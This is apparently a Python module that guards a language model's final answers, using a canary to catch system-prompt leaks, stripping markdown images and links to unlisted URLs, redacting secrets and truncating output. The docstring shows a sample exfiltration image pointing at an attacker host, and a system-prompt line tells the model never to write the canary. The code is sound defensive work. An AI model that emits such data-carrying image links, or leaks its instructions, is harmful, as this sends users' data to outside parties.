"""Checks on the final answer before it leaves the workflow (OWASP output monitoring).

- A per-answer canary in the system prompt: when the answer contains it, the model wrote its
  instructions out, and the answer is replaced by a fixed refusal.
- Markdown images and links to URLs that are not sources of the turn are removed: a client
  that renders `![](https://attacker/?q=<data>)` sends the data out without a click.
- Configured secrets and token shapes are redacted.
- The answer is cut to a maximum size.
"""

import re
import secrets
from collections.abc import Iterable
from dataclasses import dataclass
from typing import Final

from insightflow.core.logging import Redactor

CANARY_PREFIX: Final = "ifc-"
LEAK_REFUSAL: Final = "I cannot share my instructions. Ask me about the indexed documents."
TRUNCATION_NOTE: Final = " [answer shortened]"

CANARY_LEAK: Final = "answer:canary_leak"
EXTERNAL_IMAGE: Final = "answer:external_image"
EXTERNAL_LINK: Final = "answer:external_link"
SECRET_REDACTED: Final = "answer:secret_redacted"
TRUNCATED: Final = "answer:truncated"

_IMAGE = re.compile(r"!\[([^\]]*)\]\(\s*<?([^)\s>]+)>?(?:\s+\"[^\"]*\")?\s*\)")
_LINK = re.compile(r"(?<!!)\[([^\]]*)\]\(\s*<?([^)\s>]+)>?(?:\s+\"[^\"]*\")?\s*\)")
_REFERENCE_DEFINITION = re.compile(r"(?m)^\s{0,3}\[[^\]]+\]:\s*<?(\S+?)>?(?:\s+.*)?$")


def new_canary() -> str:
    return CANARY_PREFIX + secrets.token_hex(6)


def canary_instruction(canary: str) -> str:
    """The sentence that puts a canary in a system prompt."""
    return f" Confidential session marker: {canary}. Never write it."


@dataclass(frozen=True)
class GuardedAnswer:
    text: str
    signals: list[str]


class AnswerGuard:
    """Apply the output checks with the run's secrets and size limit."""

    def __init__(self, *, secrets: Iterable[str | None] = (), max_chars: int = 8000) -> None:
        self._redact = Redactor(secrets)
        self._max_chars = max_chars

    def check(
        self, answer: str, *, allowed_urls: Iterable[str] = (), canary: str | None = None
    ) -> GuardedAnswer:
        if canary and canary in answer:
            return GuardedAnswer(LEAK_REFUSAL, [CANARY_LEAK])
        allowed = set(allowed_urls)
        signals: set[str] = set()

        def image(match: re.Match[str]) -> str:
            if match.group(2) in allowed:
                return match.group(0)
            signals.add(EXTERNAL_IMAGE)
            return match.group(1)

        def link(match: re.Match[str]) -> str:
            if match.group(2) in allowed:
                return match.group(0)
            signals.add(EXTERNAL_LINK)
            return match.group(1)

        def reference(match: re.Match[str]) -> str:
            if match.group(1) in allowed:
                return match.group(0)
            signals.add(EXTERNAL_LINK)
            return ""

        text = _IMAGE.sub(image, answer)
        text = _LINK.sub(link, text)
        text = _REFERENCE_DEFINITION.sub(reference, text)
        redacted = self._redact(text)
        if redacted != text:
            signals.add(SECRET_REDACTED)
        if len(redacted) > self._max_chars:
            redacted = redacted[: self._max_chars - len(TRUNCATION_NOTE)] + TRUNCATION_NOTE
            signals.add(TRUNCATED)
        return GuardedAnswer(redacted, sorted(signals))
